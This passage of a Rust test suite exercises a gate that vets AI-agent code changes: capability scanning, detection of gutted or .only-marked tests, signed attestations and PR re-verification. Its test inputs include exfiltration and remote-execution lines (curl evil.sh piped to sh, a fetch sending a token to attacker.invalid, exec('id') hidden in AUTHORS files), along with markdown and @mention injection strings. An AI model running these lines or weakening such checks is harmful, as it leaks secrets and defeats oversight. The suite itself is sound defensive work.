    let f = check(reason(capability::check(&base, &grown, &changed, &std::collections::BTreeMap::new())), "capability", true, Some("src/add.mjs"), &["`node:child_process`", "`src/add.mjs`"]);
    assert_eq!((f["violations"][1]["path"].as_str(), f["violations"][1]["detail"].as_str()), (Some("src/net.mjs"), Some("global:fetch")), "one violation per file: {f}");
    assert!(f["violations"][0]["allow"].as_str().unwrap().contains("operator.json"), "humans still learn how to allow it: {f}");
    let broken = with(&[("src/add.mjs", "export const add = (a, b) => a +;\n")]);
    check(reason(capability::check(&base, &broken, &git::changes(&base, &broken, &policy).unwrap(), &std::collections::BTreeMap::new())), "syntax", true, Some("src/add.mjs"), &["`src/add.mjs`"]);
    check("Tests show new runtime behavior: exec:id, net:api.example.com:443. If this is intended, allow it in the task contract (version 3): \"behaviors\": [\"exec:id\",\"net:api.example.com:443\"]".into(), "behavior", true, None, &["`exec:id`", "`net:api.example.com:443`"]);
    check("Check addition case 2 failed (exit code 1)".into(), "check-failed", true, None, &["`addition`"]);
    check("Check addition case 1 output differs from the expected answer".into(), "check-failed", true, None, &["`addition`"]);
    let mut locked = tested("bugfix");
    locked["tests"]["edits"] = json!("locked");
    check(reason(git::changes(&honest_base(), &honest_change(&[FIX, ("test/add.test.mjs", Some("// gutted\n"))]), &contract(&locked).unwrap())), "test-locked", true, Some("test/add.test.mjs"), &["`test/add.test.mjs`"]);
    check(reason(screened("feature", &[FIX, ("test/new.test.mjs", Some("import { test } from 'node:test';\ntest.only('x', () => {});\n"))])), "test-marker", true, Some("test/new.test.mjs"), &["`test.only('x')`"]);
    check(reason(screened("feature", &[FIX, ("test/.mocharc.json", Some("{}\n"))])), "test-config", true, Some("test/.mocharc.json"), &["`test/.mocharc.json`"]);
    check(reason(screened("feature", &[("src/add.mjs", Some("globalThis.expect = 1;\nexport const add = (a, b) => a + b;\n"))])), "test-tamper", true, Some("src/add.mjs"), &["`globalThis.expect`", "`src/add.mjs`"]);
    check(reason(screened("bugfix", &[FIX])), "test-missing", true, None, &["`test/`"]);
    let (b, c) = (honest_base(), honest_change(&[FIX, REGRESSION]));
    let p = contract(&tested("bugfix")).unwrap();
    let ch = git::changes(&b, &c, &p).unwrap();
    let proved = |new: &[(&str, &str)], old: &[(&str, &str)]| reason(kern::proof::prove(p.tests.as_ref().unwrap(), &b, &c, &ch, &|r, _| runs(r, &[("adds", "passed")], new, old), &mut no_edits));
    let fixed = [("adds", "passed"), ("adds 2 + 2", "passed")];
    check(proved(&fixed, &fixed), "test-proof", true, None, &["`\"adds 2 + 2\"`", "fails on the old code"]);
    check(proved(&[("adds", "failed"), ("adds 2 + 2", "passed")], &[]), "tests-failing", true, None, &["`\"adds\"`"]);
    check(proved(&[("adds 2 + 2", "passed")], &[]), "tests-not-run", true, None, &["`\"adds\"`"]);
    check(proved(&[("adds", "passed")], &[]), "test-missing", true, None, &["`test/`"]);
    let olds = std::sync::atomic::AtomicUsize::new(0);
    check(reason(kern::proof::prove(p.tests.as_ref().unwrap(), &b, &c, &ch, &|r, _| if r == kern::proof::Run::Old && olds.fetch_add(1, std::sync::atomic::Ordering::SeqCst) > 0 { runs(r, &[("adds", "passed")], &fixed, &fixed) } else { runs(r, &[("adds", "passed")], &fixed, &[("adds", "passed"), ("adds 2 + 2", "failed")]) }, &mut no_edits)),
        "test-proof", true, None, &["every time"]);
    check(reason(kern::proof::prove(p.tests.as_ref().unwrap(), &b, &c, &ch, &|r, _| if r == kern::proof::Run::New { Ok(kern::proof::Output { stdout: b"Segmentation fault\n".to_vec(), exit_code: 139 }) } else { runs(r, &[("adds", "passed")], &fixed, &fixed) }, &mut no_edits)),
        "test-results", true, None, &["new code"]);
    let (pe, edited) = (contract(&tested("refactor")).unwrap(), edited_change());
    let che = git::changes(&b, &edited, &pe).unwrap();
    let edits = |kept: &[(&str, &str)], result: &str| reason(kern::proof::prove(pe.tests.as_ref().unwrap(), &b, &edited, &che,
        &|r, _| if r == kern::proof::Run::Kept { Ok(kern::proof::Output { stdout: tap(kept), exit_code: 0 }) } else { runs(r, &[("adds", "passed")], &[("adds two numbers", "passed")], &[]) }, &mut |_| Ok(mutated(&[result]))));
    check(edits(&[("adds", "failed")], "caught"), "behavior-changed", true, None, &["`\"adds\"`"]);
    check(edits(&[("adds", "passed")], "lost"), "tests-weakened", true, None, &["src/add.mjs:1 changes + to -"]);
    check(edits(&[("adds", "passed")], "not run"), "test-edits", true, None, &["unchanged"]);
    check("The agent exited with code 3".into(), "agent", true, None, &["code 3"]);
    check(reason(kern::util::tree_paths(["src/aux.js"], true)), "file-name", true, Some("src/aux.js"), &["`src/aux.js`"]);
    check(reason(kern::util::tree_paths(["src/A.js", "src/a.js"], true)), "file-name", true, None, &["upper and lower case"]);
    let ws = Temp::new();
    std::fs::create_dir_all(ws.0.join("src")).unwrap();
    std::fs::write(ws.0.join("src/big.txt"), "x".repeat(70000)).unwrap();
    check(reason(kern::local::read_workspace(&ws.0, &base, 65536, 1048576)), "workspace", true, Some("src/big.txt"), &["`src/big.txt`"]);
    for r in ["Attestation mismatch: commit", "Attestation mismatch: base", "Pull request must carry exactly one Kern attestation block"] {
        check(r.into(), "proof-stale", false, None, &["re-verification"]);
    }
    let (from, mut onto, mut pushed) = (base.clone(), base.clone(), base.clone());
    onto.insert("src/add.mjs".into(), file("export const add = (a, b) => a - b; // reviewed\n"));
    pushed.insert("src/add.mjs".into(), file("export const add = (a, b) => a + b;\n"));
    pushed.insert("README.md".into(), file("y\n"));
    check(reason(kern::reverify::merge(&from, &onto, &pushed, "main")), "base-conflict", true, None, &["`main`", "`src/add.mjs`"]);
    onto.insert("src/add.mjs".into(), pushed["src/add.mjs"].clone());
    assert_eq!(kern::reverify::merge(&from, &onto, &pushed, "main").unwrap()["README.md"].bytes.as_deref(), Some(&b"y\n"[..]), "the same change on both sides is no conflict");
    check("independent verifier rejected the change: Check addition case 2 failed (exit code 1)".into(), "check-failed", true, None, &["`addition`"]);
    let transported = format!("independent verifier unreachable or rejected the change: sh failed (1): {}\n ", json!({ "status": "DENIED", "reason": "Check addition case 2 failed (exit code 1)" }));
    check(transported, "check-failed", true, None, &["`addition`"]);
    for r in ["The agent ran out of memory; the contract allows 256 MB (limits.memory_mb)", "The agent did not finish within 3 seconds (limits.timeout_seconds); its container was stopped and nothing was accepted",
              "Interrupted: the agent was stopped and nothing was accepted", "Invalid attestation signature", "Untrusted signing key", "independent verifier unreachable: connection refused",
              "Kern runs agents in a Linux container, but no container runtime is ready (docker: not installed)", "Something nobody planned for",
              "The test suite already fails before the change: \"adds\". The test proof needs a suite that passes; fix it on the base branch first",
              "Kern could not read the test results of the old code: the output contains no TAP report. Check tests.runner and tests.command in the task contract",
              "Check addition case @everyone failed (exit code 1)", "The agent exited with code 3 @everyone", "Sandbox crashed. Write outside contract: src/x.js. To allow it, add \"src/x.js\" to filesystem.read and filesystem.write in the task contract"] {
        let f = explain(r, None);
        assert_eq!(f["agent_fixable"], false, "{r}: {f}");
        let instruction = f["violations"][0]["instruction"].as_str().unwrap();
        assert!(!instruction.is_empty() && !instruction.contains("@everyone") && !instruction.contains(r), "raw reasons stay out of instructions: {f}");
    }
    let agent = kern::feedback::for_agent(&f);
    assert!(agent.get("reason").is_none() && agent["violations"].as_array().unwrap().iter().all(|v| v.get("allow").is_none() && v["instruction"].is_string()), "{agent}");
}

#[test]
fn feedback_comments_cannot_be_used_to_ping_people_or_break_out_of_code() {
    use kern::feedback::{comment_body, explain};
    let p = "src/@acme/owners [click](https://evil.example) ```x";
    let hostile = format!("Write outside contract: {p}. To allow it, add \"{p}\" to filesystem.read and filesystem.write in the task contract");
    let f = explain(&hostile, None);
    assert_eq!(f["agent_fixable"], true, "{f}");
    let head = "ab".repeat(20);
    let body = comment_body(&f, 1, 3, Some("@claude"), &head);
    assert!(body.contains("@claude") && body.contains("attempt 1 of 3") && body.contains(&format!("<!-- kern-feedback:v1 head={head} -->")), "{body}");
    let prose: String = body.split("````").step_by(2).collect();
    for line in prose.lines() {
        let outside: String = line.split('`').step_by(2).collect();
        assert!(!outside.contains("@acme") && !outside.contains("](https"), "agent-controlled text must stay inside code: {line}");
    }
    let json = body.split("````json\n").nth(1).unwrap().split("\n````").next().unwrap();
    assert!(!json.contains('`') && serde_json::from_str::<Value>(json).unwrap() == kern::feedback::for_agent(&f), "the machine-readable block round-trips and cannot close its fence");
    assert!(!json.contains("filesystem.write"), "the agent's copy carries no hint about loosening the gate: {json}");
    assert!(!comment_body(&explain("Invalid attestation signature", None), 1, 3, Some("@claude"), &head).contains("@claude"));
    let exhausted = comment_body(&f, 4, 3, Some("@claude"), &head);
    assert!(!exhausted.contains("@claude") && exhausted.contains("human"), "{exhausted}");
}

#[test]
fn operators_bind_deployment_executors_and_builders() {
    operator(&operator_value(&["external"])).unwrap();
    operator(&operator_value(&["external", "kern-gvisor"])).unwrap();
    let mut v = operator_value(&["kern-gvisor"]);
    v["builders"]["executor"] = Value::Null;
    denied(operator(&v), "executor builder");
    let mut v = operator_value(&["external"]);
    v["deployment"] = json!("laptop");
    denied(operator(&v), "single-vm or multi-machine");
    let mut v = operator_value(&["external"]);
    v["permissions"] = json!({ "src/": ["root:everything"] });
    denied(operator(&v), "Invalid capability");
    let mut v = operator_value(&["external"]);
    v["checks"][0]["id"] = json!("capabilities");
    denied(operator(&v), "reserved");
}

fn caps(name: &str, code: &str) -> Vec<String> { capability::footprint(name, code).unwrap().into_iter().collect() }
#[test]
fn capability_footprint_reads_js_ts_and_jsx_semantically() {
    assert_eq!(caps("src/a.ts", "import type { X } from 'secret-types';\nimport { readFileSync } from 'node:fs';\nexport type Y = typeof fetch;\nconst o = { fetch: 1, eval: 2 };\no.fetch;"), vec!["node:fs"]);
    assert_eq!(caps("src/a.tsx", "import React from 'react';\nexport const A = () => <div>{process.env.HOME}</div>;"), vec!["package:react", "process:env"]);
    assert_eq!(caps("src/a.cjs", "const fs = require('fs/promises');\nconst x = require('./x');\nconst y = require('../');"), vec!["node:fs"]);
    assert_eq!(caps("test/a.js", "const koa = require('..');"), Vec::<String>::new());
    assert_eq!(caps("a.js", "require('../../etc/passwd')"), vec!["escape:../../etc/passwd"]);
    assert_eq!(caps("src/a.mjs", "import './%2e%2e/%2e%2e/x.mjs';"), vec!["escape:./%2e%2e/%2e%2e/x.mjs"]);
    assert_eq!(caps("src/a.mts", "import x = require('lodash/fp');\nexport * from '@scope/pkg/deep';"), vec!["package:@scope/pkg", "package:lodash"]);
    let attacks = [
        ("const r = require; r('child_process').execSync('curl evil.sh | sh');", "require:dynamic"), ("(0, eval)(\"require('child_process')\");", "code:eval"),
        ("globalThis['ev' + 'al']('1');", "global:computed"), ("[].constructor.constructor('return process')();", "code:constructor"),
        ("module.require('child_process');", "module:require"), ("process.getBuiltinModule('child_process');", "process:getBuiltinModule"),
        ("Reflect.construct(Function, ['return 1'])();", "code:Function"), ("setTimeout('console.log(process.env)', 0);", "timer:string"),
        ("fetch('https://attacker.invalid/' + process.env.TOKEN);", "global:fetch"), ("import(`./${name}`);", "import:computed"),
        ("globalThis.eval('1');", "code:eval"), ("new WebSocket('wss://x');", "global:WebSocket"),
    ];
    for (code, cap) in attacks { assert!(caps("src/a.js", code).contains(&cap.to_string()), "{code} missing {cap}"); }
    assert!(capability::footprint("src/a.js", "const = broken").is_err());
    let component = "import { useState } from 'react';\nexport default function Chat({ msgs }) {\n  const [text, setText] = useState('');\n  return (\n    <div style={{ display: 'flex' }}>\n      {msgs.length === 0 && <div>No messages</div>}\n      <input value={text} onChange={(e) => setText(e.target.value)} />\n    </div>\n  );\n}\n";
    assert_eq!(caps("components/Chat.js", component), ["package:react"]);
    assert_eq!(caps("components/Old.js", "var React = require('react');\nmodule.exports = function Old() { return <p onClick={() => fetch('/x')}>old</p>; };\n"), ["global:fetch", "package:react"]);
    assert!(caps("src/cmp.js", "const a = 1, b = 2, c = 3;\nmodule.exports = a < b > c;\n").is_empty());
    assert!(capability::footprint("components/Broken.js", "export default () => <div>;\n").is_err());
    let screened = kern::proof::screen(&files(&[]), &files(&[("components/Chat.js", component)]), &json!({ "files": [{ "path": "components/Chat.js", "operation": "add" }] }), contract(&tested("feature")).unwrap().tests.as_ref().unwrap());
    assert!(screened.is_ok(), "{screened:?}");
}
#[test]
fn capability_check_blocks_only_widening_with_file_directory_and_operator_baselines() {
    let base = files(&[("src/a.js", "const fs = require('fs');\nmodule.exports = () => fs.existsSync('x');\n"), ("src/b.js", "const path = require('path');\n"), ("test/a.test.js", "const assert = require('assert');\n")]);
    let allow = std::collections::BTreeMap::from([("test/".to_string(), vec!["node:assert".to_string()])]);
    let check = |c: &Files| { let changed = git::changes(&base, c, &contract(&policy_value()).unwrap()).unwrap(); capability::check(&base, c, &changed, &allow) };
    let mut edit = base.clone();
    edit.insert("src/a.js".into(), file("const fs = require('fs');\nmodule.exports = () => fs.existsSync('y');\n"));
    check(&edit).unwrap();
    let mut sibling = base.clone();
    sibling.insert("src/c.js".into(), file("const path = require('path');\nconst fs = require('fs');\n"));
    check(&sibling).unwrap();
    let mut test = base.clone();
    test.insert("test/new.test.js".into(), file("const assert = require('node:assert');\n"));
    check(&test).unwrap();
    for attack in ["require('child_process').exec('id');", "fetch('https://attacker.invalid');", "const r = require; r('net');", "process.env.SECRET;"] {
        let mut c = base.clone();
        c.insert("src/a.js".into(), file(&format!("const fs = require('fs');\n{attack}\n")));
        denied(check(&c), "widens module capabilities");
    }
    let mut ts = base.clone();
    ts.insert("src/types.ts".into(), file("export const x: number = 1;\n"));
    check(&ts).unwrap();
    let mut shell = base.clone();
    shell.insert("src/run.sh".into(), file("curl x\n"));
    denied(check(&shell), "Unsupported changed file type");
    for name in ["src/AUTHORS", "src/CONTRIBUTORS", "src/CHANGELOG"] {
        let mut docs = base.clone();
        docs.insert(name.into(), file("Jane Doe <jane@example.com>\n"));
        check(&docs).unwrap();
        let mut hidden = base.clone();
        hidden.insert(name.into(), file("require('child_process').exec('id');\n"));
        denied(check(&hidden), "widens module capabilities");
    }
    for name in ["src/Makefile", "src/Dockerfile", "src/LICENSE"] {
        let mut build = base.clone();
        build.insert(name.into(), file("all:\n\tcurl x\n"));
        denied(check(&build), "Unsupported changed file type");
    }
}

#[test]
fn attestation_is_canonical_in_toto_vsa_bound_to_exact_expectations() {
    let f = fixture();
    let stmt: Value = serde_json::from_slice(&unb64(f.envelope["payload"].as_str().unwrap()).unwrap()).unwrap();
    assert_eq!(f.envelope["payloadType"], "application/vnd.in-toto+json");
    assert_eq!(stmt["_type"], "https://in-toto.io/Statement/v1");
    assert_eq!(stmt["predicateType"], "https://slsa.dev/verification_summary/v1");
    assert_eq!(stmt["subject"][0]["digest"]["gitCommit"], f.commit);
    assert_eq!(stmt["predicate"]["verificationResult"], "PASSED");
    assert!(stmt["predicate"]["verifiedLevels"][0].as_str().unwrap().starts_with("KERN_"));
    let d = promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &expected(&f), now_ms()).unwrap();
    assert_eq!(d.commit, f.commit);
    for field in ["run_id", "task", "repository", "base", "commit", "manifest_sha256", "contract_sha256", "verifier_sha256", "verifier_builder_sha256", "deployment", "image", "runtime"] {
        let mut k = f.kern.clone();
        k[field] = json!("wrong");
        let env = attest::sign(&k, &KeySource::File(f.key.clone())).unwrap();
        assert!(promote::authorize(&f.store, &env, &f.public, &f.policy, &f.op, &expected(&f), now_ms()).is_err(), "{field}");
    }
    for (mutate, needle) in [
        (Box::new(|k: &mut Value| { k["checks"].as_array_mut().unwrap().pop(); }) as Box<dyn Fn(&mut Value)>, "check set"), (Box::new(|k: &mut Value| k["checks"][0]["status"] = json!("FAIL")), "failed"),
        (Box::new(|k: &mut Value| k["expires_at"] = k["issued_at"].clone()), "time window"), (Box::new(|k: &mut Value| k["issued_at"] = json!(now_ms() + 100000)), "time window"),
        (Box::new(|k: &mut Value| k["executor"]["kind"] = json!("kern-gvisor")), "not accepted"), (Box::new(|k: &mut Value| k["override"] = json!(true)), "unknown fields"),
    ] {
        let mut k = f.kern.clone();
        mutate(&mut k);
        let env = attest::sign(&k, &KeySource::File(f.key.clone())).unwrap();
        denied(promote::authorize(&f.store, &env, &f.public, &f.policy, &f.op, &expected(&f), now_ms()), needle);
    }
    let mut stmt2 = stmt.clone();
    stmt2["predicate"]["verificationResult"] = json!("FAILED");
    let bytes = canonical(&stmt2).unwrap().into_bytes();
    let sig = ed25519_dalek::Signer::sign(&f.key, &attest::pae(attest::PAYLOAD_TYPE, &bytes));
    let forged = json!({ "payloadType": attest::PAYLOAD_TYPE, "payload": b64(&bytes), "signatures": [{ "keyid": f.envelope["signatures"][0]["keyid"], "sig": b64(&sig.to_bytes()) }] });
    denied(promote::authorize(&f.store, &forged, &f.public, &f.policy, &f.op, &expected(&f), now_ms()), "canonical");
    let other = attest::public_pem(&SigningKey::from_bytes(&random_bytes::<32>().unwrap()).verifying_key()).unwrap();
    denied(promote::authorize(&f.store, &f.envelope, &other, &f.policy, &f.op, &expected(&f), now_ms()), "Untrusted");
    let mut tampered = f.envelope.clone();
    tampered["payload"] = json!(b64(b"{}"));
    denied(promote::authorize(&f.store, &tampered, &f.public, &f.policy, &f.op, &expected(&f), now_ms()), "signature");
    denied(promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &expected(&f), now_ms() + 3_600_000), "expired");
    let mut main = expected(&f);
    main["branch"] = json!("main");
    denied(promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &main, now_ms()), "run-specific");
}
#[test]
fn promotion_is_create_only_and_consumed_exactly_once() {
    let f = fixture();
    let d = promote::authorize(&f.store, &f.envelope, &f.public, &f.policy, &f.op, &expected(&f), now_ms()).unwrap();
    let target = git::init_store(&f.t.join("target.git")).unwrap();
    git::write_commit(&target, &f.original, None, "fixture").unwrap();
    promote::promote_local(&f.store, &d, &f.public, &target, None).unwrap();
    assert_eq!(git::trimmed(git::git(&target, &["rev-parse", &format!("refs/heads/{}", d.branch)], None).unwrap()), f.commit);
    git::git(&target, &["update-ref", "-d", &format!("refs/heads/{}", d.branch)], None).unwrap();
    denied(promote::promote_local(&f.store, &d, &f.public, &target, None), "already consumed");
    let ledger = f.t.join("ledger");
    let handles: Vec<_> = (0..8).map(|_| { let (l, dd, k) = (ledger.clone(), promote::Decision { repository: d.repository.clone(), branch: d.branch.clone(), base: d.base.clone(), commit: d.commit.clone(), run_id: d.run_id.clone(), attestation: Value::Null }, f.public.clone()); std::thread::spawn(move || promote::consume(&l, &dd, &k).is_ok()) }).collect();
    assert_eq!(handles.into_iter().map(|h| h.join().unwrap()).filter(|ok| *ok).count(), 1);
}
#[test]
fn github_required_check_reverifies_the_exact_pr_head() {
    let f = fixture();
    let repo = f.t.join("gh");
    sh(&f.t.0, &["init", "-q", "gh"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    for (p, c) in &f.original { std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap(); std::fs::write(repo.join(p), c.bytes.as_deref().unwrap()).unwrap(); }
    std::fs::create_dir_all(repo.join(".github/kern/tasks")).unwrap();
    let mut op = operator_value(&["external"]);
    op["checks"][0]["file"] = json!(std::path::absolute("checks.json").unwrap());
    std::fs::write(repo.join(".github/kern/operator.json"), op.to_string()).unwrap();
    std::fs::write(repo.join(".github/kern/verifier.pub"), &f.public).unwrap();
    std::fs::write(repo.join(".github/kern/tasks/fix-addition.json"), policy_value().to_string()).unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    let mut candidate = git::read_commit(&repo, &base, 1048576, 16777216).unwrap();
    candidate.insert("src/add.mjs".into(), file("export const add = (a, b) => a + b;\n"));
    let head = git::write_commit(&repo, &candidate, Some(&base), "fix-addition").unwrap();
    let policy = contract(&policy_value()).unwrap();
    let opr = operator(&op).unwrap();
    let manifest = digest(&git::manifest(&repo, &head, 65536, 1048576).unwrap()).unwrap();
    let run_id = uuid4().unwrap();
    let envelope = attest::sign(&kern_payload(&policy, &opr, &run_id, &base, &head, &manifest, now_ms() - 7_200_000), &KeySource::File(f.key.clone())).unwrap();
    let d = promote::Decision { repository: "acme/project".into(), branch: format!("kern/fix-addition/{run_id}"), base: base.clone(), commit: head.clone(), run_id: run_id.clone(), attestation: Value::Null };
    let event = |head_sha: &str, base_sha: &str, branch: &str, body: &str| json!({ "pull_request": { "head": { "sha": head_sha, "ref": branch }, "base": { "sha": base_sha, "repo": { "full_name": "acme/project" } }, "body": body } });
    let body = promote::pr_body("fix-addition", &d, &envelope, None).unwrap();
    let pass = promote::check_pr(&event(&head, &base, &d.branch, &body), &repo, ".github/kern", now_ms()).unwrap();
    assert_eq!(pass["status"], "PASS");
    assert_eq!(promote::check_pr(&event(&head, &base, "feature/human", ""), &repo, ".github/kern", now_ms()).unwrap()["status"], "SKIPPED");
    denied(promote::check_pr(&event(&head, &base, &d.branch, "no attestation"), &repo, ".github/kern", now_ms()), "exactly one");
    denied(promote::check_pr(&event(&base, &base, &d.branch, &body), &repo, ".github/kern", now_ms()), "Attestation mismatch");
    let mut moved = candidate.clone();
    moved.insert("src/extra.mjs".into(), file("export const z = 1;\n"));
    let new_head = git::write_commit(&repo, &moved, Some(&base), "x").unwrap();
    denied(promote::check_pr(&event(&new_head, &base, &d.branch, &body), &repo, ".github/kern", now_ms()), "Attestation mismatch");
    let next_base = git::write_commit(&repo, &f.original, Some(&base), "moved").unwrap();
    denied(promote::check_pr(&event(&head, &next_base, &d.branch, &body), &repo, ".github/kern", now_ms()), "");
    let wrong_key = attest::sign(&kern_payload(&policy, &opr, &run_id, &base, &head, &manifest, now_ms() - 1000), &KeySource::File(SigningKey::from_bytes(&random_bytes::<32>().unwrap()))).unwrap();
    denied(promote::check_pr(&event(&head, &base, &d.branch, &promote::pr_body("fix-addition", &d, &wrong_key, None).unwrap()), &repo, ".github/kern", now_ms()), "Untrusted");
}
type Seen = std::sync::Arc<std::sync::Mutex<Vec<(String, String, String)>>>;
struct StubApi { url: String, seen: Seen }
fn stub_api(route: impl Fn(&str, &str) -> (u16, String) + Send + Sync + 'static) -> StubApi { stub_server(move |m, p, _| route(m, p)) }
fn stub_server(route: impl Fn(&str, &str, &str) -> (u16, String) + Send + Sync + 'static) -> StubApi {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    let seen: Seen = Default::default();
    let log = seen.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            let Ok(mut s) = stream else { continue };
            let mut reader = std::io::BufReader::new(s.try_clone().unwrap());
            let mut request = String::new();
            if std::io::BufRead::read_line(&mut reader, &mut request).is_err() { continue; }
            let mut length = 0usize;
            loop {
                let mut line = String::new();
                if std::io::BufRead::read_line(&mut reader, &mut line).unwrap_or(0) == 0 || line == "\r\n" { break; }
                if let Some(v) = line.to_ascii_lowercase().strip_prefix("content-length:") { length = v.trim().parse().unwrap_or(0); }
            }
            let mut body = vec![0u8; length];
            let _ = std::io::Read::read_exact(&mut reader, &mut body);
            let parts: Vec<&str> = request.split_whitespace().collect();
            let (method, path) = (parts.first().copied().unwrap_or(""), parts.get(1).copied().unwrap_or(""));
            log.lock().unwrap().push((method.to_string(), path.to_string(), String::from_utf8_lossy(&body).to_string()));
            let (status, reply) = route(method, path, &String::from_utf8_lossy(&body));
            let _ = std::io::Write::write_all(&mut s, format!("HTTP/1.1 {status} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{reply}", reply.len()).as_bytes());
        }
    });
    StubApi { url, seen }
}

struct PrGate { t: Temp, repo: PathBuf, base: String, head: String, envelope: Value, branch: String }
fn pr_gate(head_code: &str) -> PrGate {
    let f = fixture();
    let repo = f.t.join("gh");
    sh(&f.t.0, &["init", "-q", "gh"]);
    sh(&repo, &["config", "core.autocrlf", "false"]);
    for (p, c) in &f.original { std::fs::create_dir_all(repo.join(p).parent().unwrap()).unwrap(); std::fs::write(repo.join(p), c.bytes.as_deref().unwrap()).unwrap(); }
    std::fs::create_dir_all(repo.join(".github/kern/tasks")).unwrap();
    let op = operator_value(&["external"]);
    std::fs::write(repo.join(".github/kern/operator.json"), op.to_string()).unwrap();
    std::fs::write(repo.join(".github/kern/verifier.pub"), &f.public).unwrap();
    std::fs::write(repo.join(".github/kern/tasks/fix-addition.json"), policy_value().to_string()).unwrap();
    sh(&repo, &["add", "-A"]);
    sh(&repo, &["commit", "-qm", "base"]);
    let base = sh(&repo, &["rev-parse", "HEAD"]);
    let mut candidate = git::read_commit(&repo, &base, 1048576, 16777216).unwrap();
    candidate.insert("src/add.mjs".into(), file(head_code));
    let head = git::write_commit(&repo, &candidate, Some(&base), "fix-addition").unwrap();
    let (policy, opr) = (contract(&policy_value()).unwrap(), operator(&op).unwrap());
    let manifest = digest(&git::manifest(&repo, &head, 65536, 1048576).unwrap()).unwrap();
    let run_id = uuid4().unwrap();
    let envelope = attest::sign(&kern_payload(&policy, &opr, &run_id, &base, &head, &manifest, now_ms() - 1000), &KeySource::File(f.key.clone())).unwrap();
    let branch = format!("kern/fix-addition/{run_id}");
    PrGate { t: f.t, repo, base, head, envelope, branch }
}
struct Checked { code: Option<i32>, summary: String, output: String, feedback: Option<Value>, posted: Vec<String> }
fn check_pr_with(g: &PrGate, envelope: &Value, api: &StubApi, env: &[(&str, &str)]) -> Checked {
    let d = promote::Decision { repository: "acme/project".into(), branch: g.branch.clone(), base: g.base.clone(), commit: g.head.clone(), run_id: String::new(), attestation: Value::Null };
    let event = json!({ "repository": { "full_name": "acme/project" }, "pull_request": { "number": 7, "head": { "sha": g.head, "ref": g.branch }, "base": { "sha": g.base, "repo": { "full_name": "acme/project" } },
        "body": promote::pr_body("fix-addition", &d, envelope, None).unwrap() } });
    let dir = g.t.join(&format!("check-{}", uuid4().unwrap()));
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("event.json"), event.to_string()).unwrap();
    api.seen.lock().unwrap().clear();
    let out = Command::new(env!("CARGO_BIN_EXE_kern")).arg("check-pr").arg(dir.join("event.json")).arg(&g.repo).envs(env.iter().copied())
        .env("GITHUB_STEP_SUMMARY", dir.join("summary.md")).env("GITHUB_OUTPUT", dir.join("output.txt")).env("KERN_FEEDBACK_PATH", dir.join("feedback.json"))
        .env("GITHUB_API_URL", &api.url).env("GITHUB_TOKEN", "t0k3n").output().unwrap();
    let read = |n: &str| std::fs::read_to_string(dir.join(n)).unwrap_or_default();
    let posted = api.seen.lock().unwrap().iter().filter(|(m, p, _)| m == "POST" && p == "/repos/acme/project/issues/7/comments")
        .map(|(_, _, b)| serde_json::from_str::<Value>(b).unwrap()["body"].as_str().unwrap().to_string()).collect();
    Checked { code: out.status.code(), summary: read("summary.md"), output: read("output.txt"), feedback: serde_json::from_str(&read("feedback.json")).ok(), posted }
}
fn previous(comments: &[(&str, &str)]) -> String {
    json!(comments.iter().map(|(author, head)| json!({ "user": { "login": author }, "body": format!("### Kern blocked this change\n<!-- kern-feedback:v1 head={head} -->") })).collect::<Vec<_>>()).to_string()
}
fn comments_api(page: String) -> StubApi {
    stub_api(move |method, path| match (method, path) {
        ("GET", p) if p.starts_with("/repos/acme/project/issues/7/comments") && p.ends_with("&page=1") => (200, page.clone()),
        ("GET", _) => (200, "[]".into()),
        ("POST", "/repos/acme/project/issues/7/comments") => (201, json!({ "html_url": "https://github.com/acme/project/pull/7#c" }).to_string()),
        _ => (404, "{}".into()),
    })
}

struct Hub { t: Temp, server: PathBuf, url: String, base0: String, c0: String, branch: String, run_id: String, policy: Contract, op: Operator, key: SigningKey, envelope: Value }
fn hub() -> Hub {
    let f = fixture();
    let server = f.t.join("server").join("acme").join("project.git");
    std::fs::create_dir_all(&server).unwrap();
    sh(&server, &["init", "-q"]);
    for (k, v) in [("core.autocrlf", "false"), ("uploadpack.allowAnySHA1InWant", "true")] { sh(&server, &["config", k, v]); }
    sh(&server, &["symbolic-ref", "HEAD", "refs/heads/main"]);
    for (p, c) in &f.original { std::fs::create_dir_all(server.join(p).parent().unwrap()).unwrap(); std::fs::write(server.join(p), c.bytes.as_deref().unwrap()).unwrap(); }
    std::fs::create_dir_all(server.join(".github/kern/tasks")).unwrap();
    let op_value = operator_value(&["external"]);
    std::fs::write(server.join(".github/kern/operator.json"), op_value.to_string()).unwrap();
    std::fs::write(server.join(".github/kern/verifier.pub"), &f.public).unwrap();
    std::fs::write(server.join(".github/kern/tasks/fix-addition.json"), policy_value().to_string()).unwrap();
    sh(&server, &["add", "-A"]);
    sh(&server, &["commit", "-qm", "base"]);
    let base0 = sh(&server, &["rev-parse", "HEAD"]);
    let mut fixed = git::read_commit(&server, &base0, 1048576, 16777216).unwrap();
    fixed.insert("src/add.mjs".into(), file("export const add = (a, b) => a + b;\n"));
    let c0 = git::write_commit(&server, &fixed, Some(&base0), "fix-addition").unwrap();
    let (policy, op) = (contract(&policy_value()).unwrap(), operator(&op_value).unwrap());
    let manifest = digest(&git::manifest(&server, &c0, 65536, 1048576).unwrap()).unwrap();
    let run_id = uuid4().unwrap();
    let envelope = attest::sign(&kern_payload(&policy, &op, &run_id, &base0, &c0, &manifest, now_ms() - 1000), &KeySource::File(f.key.clone())).unwrap();
    let branch = format!("kern/fix-addition/{run_id}");
    sh(&server, &["update-ref", &format!("refs/heads/{branch}"), &c0]);
    let root = f.t.join("server").display().to_string().replace('\\', "/");
    let url = if root.starts_with('/') { format!("file://{root}") } else { format!("file:///{root}") };
    Hub { t: f.t, server, url, base0, c0, branch, run_id, policy, op, key: f.key, envelope }
}
impl Hub {
    fn commit(&self, parent: &str, edits: &[(&str, &str)], branch: &str) -> String {
